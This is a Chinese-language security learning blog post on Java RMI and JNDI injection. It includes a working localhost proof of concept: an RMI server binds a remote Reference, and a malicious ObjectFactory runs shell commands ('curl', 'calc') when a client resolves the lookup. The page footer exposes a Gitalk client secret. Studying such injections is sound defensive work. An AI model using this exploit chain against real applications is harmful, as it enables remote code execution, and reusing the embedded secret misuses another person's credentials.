@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>JNDI注入和unserialize学习 | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Java RMI
+RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。
+RMI依赖的..." />
+    <meta name="keywords" content="信息安全" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">JNDI注入和unserialize学习</h2>
+            <div class="post-date">2021-09-30</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="java-rmi">Java RMI</h2>
+<p>RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。<br>
+RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。<br>
+这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。<br>
+<img src="https://0xwi11.github.io/post-images/1678595437633.png" alt="" loading="lazy"></p>
+<p>如上图所示，在JVM之间通信时，客户端要调用远程服务器上的对象时，并不是直接将远程对象拷贝到本地，而是通过传递一个stub。</p>
+<p>其中stub就包含了远程服务器的地址和端口等信息，可以看作是远程对象的引用，客户端可以通过调用stub中的方法来对远程对象进行使用，也就是上图所说的逻辑上的调用，而非直接调用，即真实的数据是从客户端到服务端远程对象的stub(存根)到服务器的skeleton(骨架)之间的socket通信。</p>
+<p>实际上client并不知道远程服务器的通信地址和端口，但是服务器对象存根(stub)中有这些信息，那么客户端只要拿到stub，通过调用stub上的方法，然后stub再连接到远程服务器的具体端口，服务器执行client所请求的具体方法，再讲运行结果返回给stub，stub再将结果返回给client，此时client表面上看起来即为在本地执行了远程服务器上指定对象的方法，而这个执行过程对client实际上是透明的。</p>
+<p>至于如何获取stub，常见方法为通过RMI注册表(RMIRegistry)来解决这个问题，RMIRegistry也为远程对象，此时监听在1099端口，注册远程对象需要RMI URL 和一个远程对象的引用(实际上就是一个路由对应着一个远程服务器上类的实例化对象)。而此时客户端首先可以通过RMI注册表查询到远程对象的名称，先获取stub，然后来调用该stub来调用远程对象所属类中的方法。</p>
+<p>比如如下例子：</p>
+<p>远程服务端：</p>
+<pre><code class="language-java">IHello rhello = new HelloImpl();
+LocateRegistry.createRegistry(1099);
+Naming.bind(&quot;rmi://0.0.0.0:1099/hello&quot;, rhello);
+</code></pre>
+<p>此时远程服务端RMI注册表监听1099端口，并设置RMI URL和对应该URL的类对象</p>
+<p>客户端：</p>
+<pre><code class="language-java">Registry registry = LocateRegistry.getRegistry(&quot;远程服务器地址&quot;,1099);
+IHello rhello = (IHello) registry.lookup(&quot;hello&quot;);
+rhello.sayHello(&quot;test&quot;);
+</code></pre>
+<p>此时客户端访问远程服务器RMI注册表，得到该RMI注册表的对象，此时再访问其中URL中的hello，即可以获得服务器端绑定到hello的类的对象，此时就可以进行调用sayHello方法，其中方法是在服务端执行的，服务端执行结束将返回结果返回给客户端，即在整个流程客户端也就完成了对远程服务器上的对象的使用。</p>
+<p><strong>动态加载类：</strong><br>
+这点根据我的理解应该是服务端可以将不同的url与类写到RMI注册表中，当客户端的jvm想要调用某个类时，可以根据服务端传递过来的url去远程下载类对应的class文件到本地来进行调用。</p>
+<h2 id="jndi注入">JNDI注入</h2>
+<p><strong>JNDI介绍</strong><br>
+第一部分已经说过我们可以通过url和对象写到rmi注册表中，此时客户端可以通过url来对远程对象进行加载，而jndi为java服务和目录接口，JNDI提供统一的客户端API，通过不同的访问提供者接口,JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互，所以我们可以通过jdni来访问远程的url来获取我们需要的服务，那么如果服务端将对象注册到RMI注册表中，我们即可以通过jndi来对此对象进行访问。每一个对象都有键值对，与名字和对象进行绑定，可以通过名字来对对象进行访问，对象可能存储在rmi、ldap中。</p>
+<p>java可以将对象存储在naming或者directory服务下，提供了naming reference功能，其中对象绑定到reference上，存储在naming或者directory服务下，(rmi,ldap等)。在使用reference的时候，将对象绑定到构造方法中，从而在被调用的时候触发。<br>
+<strong>案例</strong><br>
+person类(位于远程服务器上，也就是我们想要调用的类)</p>
+<pre><code class="language-java">package JavaUnser;
+import java.io.Serializable;
+import java.rmi.Remote;
+public class Person implements Remote,Serializable {
+    private static final long serialVersionUID = 1L;
+    private String name;
+    private String password;
+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getPassword() {
+        return password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    public String toString(){
+        return &quot;name:&quot;+name+&quot; password:&quot;+password;
+    }
+}
+</code></pre>
+<p>RMI服务端：</p>
+<pre><code class="language-java">package JavaUnser;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import javax.naming.spi.NamingManager;
+public class test {
+    public static void initPerson() throws Exception{
+        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
+        LocateRegistry.createRegistry(3001);
+        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:3001&quot;);
+        ////初始化
+        InitialContext ctx = new InitialContext();
+        //实例化person对象
+        Person p = new Person();
+        p.setName(&quot;hello&quot;);
+        p.setPassword(&quot;jndi&quot;);
+        //person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引
+        ctx.bind(&quot;person&quot;, p);
+        ctx.close();
+
+    }
+    public static void findPerson() throws Exception{
+
+        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了
+        InitialContext ctx = new InitialContext();
+        //通过lookup查找person对象
+        Person person = (Person) ctx.lookup(&quot;person&quot;);
+        //打印出这个对象
+        System.out.println(person.toString());
+        ctx.close();
+    }
+    public static void main(String[] args) throws Exception {
+        initPerson();
+        findPerson();
+    }
+
+}
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1678595596428.png" alt="" loading="lazy"><br>
+在初始化完上下文context(一组名称和对象绑定组成的键值对)后，此时可以看到defaultinitCtx中已经包含了jndi的环境变量信息，及服务提供者的url和工厂类的信息，也包括了服务器的host地址和已经提供rmi注册表服务的端口<br>
+<img src="https://0xwi11.github.io/post-images/1678595619975.png" alt="" loading="lazy"><br>
+在findperson中，我们直接可以通过初始化context来通过lookup函数，来对rmi服务进行访问，从而获取person对象<br>
+这里我们已经知道可以通过lookup函数来加载远程对象，lookup实际上就要去访问rmi注册表去取回我们想要的对象<br>
+<img src="https://0xwi11.github.io/post-images/1678595651924.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678595670220.png" alt="" loading="lazy"></p>
+<p>而getURLOrDefaultInitCtx函数中会根据不同情况来返回ctx，那么如果lookup函数的参数可控，我们可以指定恶意的rmi注册表地址，让客户端加载恶意的对象</p>
+<p>JNDI注入的场景有：<br>
+rmi、通过jndi reference远程调用object方法。<br>
+CORBA IOR 远程获取实现类（Common Object Request Broker Architecture,公共对象请求代理体系结构，通用对象请求代理体系结构   IOR：可互操作对象引用。）<br>
+LDAP 通过序列化对象，JNDI Referene，ldap地址</p>
+<p><strong>JNDI注入例子</strong><br>
+客户端：</p>
+<p>client.java</p>
+<pre><code class="language-java">package JavaUnser;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+public class client {
+    public static void main(String[] args) throws Exception {
+        String uri = &quot;rmi://127.0.0.1:1099/aa&quot;;
+        Context ctx = new InitialContext();
+        ctx.lookup(uri);
+    }
+}
+</code></pre>
+<p>通过初始化context，然后调用lookup函数来访问rmi注册表，尝试调用远程对象</p>
+<p>server.java</p>
+<pre><code class="language-java">package JavaUnser;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.Reference;
+import java.rmi.registry.Registry;
+import java.rmi.registry.LocateRegistry;
+public class server {
+    public static void main(String args[]) throws Exception {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Reference aa = new Reference(&quot;execObj&quot;, &quot;execObj&quot;, &quot;http://127.0.0.1:8081/&quot;);
+        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
+        System.out.println(&quot;Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'&quot;);
+        registry.bind(&quot;aa&quot;, refObjWrapper);
+
+    }
+
+}
+</code></pre>
+<p>此时服务端通过reference将远程对象可以绑定到rmi注册表中，通过reference，可以将远程对象放置在其他服务器上，此时攻击者只要提供恶意的对象供客户端调用即可实现rce</p>
+<p>exec.java</p>
+<pre><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+public class exec implements ObjectFactory {
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        System.out.println(&quot;sssss&quot;);
+        Runtime.getRuntime().exec(&quot;curl 127.0.0.1:8081&quot;);
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        return null;
+    }
+}
+</code></pre>
+<p>此时即可以编译exec.java得到exec.class字节码文件，然后将exec.class文件放置在服务器上<br>
+<code>python -m SimpleHTTPServer 8081</code><br>
+本地监听8081端口，这个端口也就是与工厂地址相吻合的<br>
+<img src="https://0xwi11.github.io/post-images/1678595817405.png" alt="" loading="lazy"><br>
+其中factory即为我们想要从http://127.0.0.1:8081请求的class文件的名称，然后启动rmi服务端<br>
+<img src="https://0xwi11.github.io/post-images/1678595856598.png" alt="" loading="lazy"><br>
+此时启动客户端对exec.class文件进行加载，此时成功执行<br>
+<img src="https://0xwi11.github.io/post-images/1678595873245.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678595896333.png" alt="" loading="lazy"></p>
+<p>此时成功加载了远程的class文件，并且rce</p>
+<p>总结：<br>
+1、lookup参数可控。<br>
+2、InitialContext类及他的子类的lookup方法允许动态协议转换<br>
+3、lookup查找的对象是Reference类型及其子类<br>
+4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。</p>
+<p>1.rmi、通过jndi reference远程调用object方法<br>
+2.LDAP 通过序列化对象，JNDI Referene，ldap地址<br>
+3.CORBA IOR 远程获取实现类 (通过iiop协议)</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
+                    信息安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/java-dong-tai-dai-li/">
+                  <h3 class="post-title">
+                    java 动态代理
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
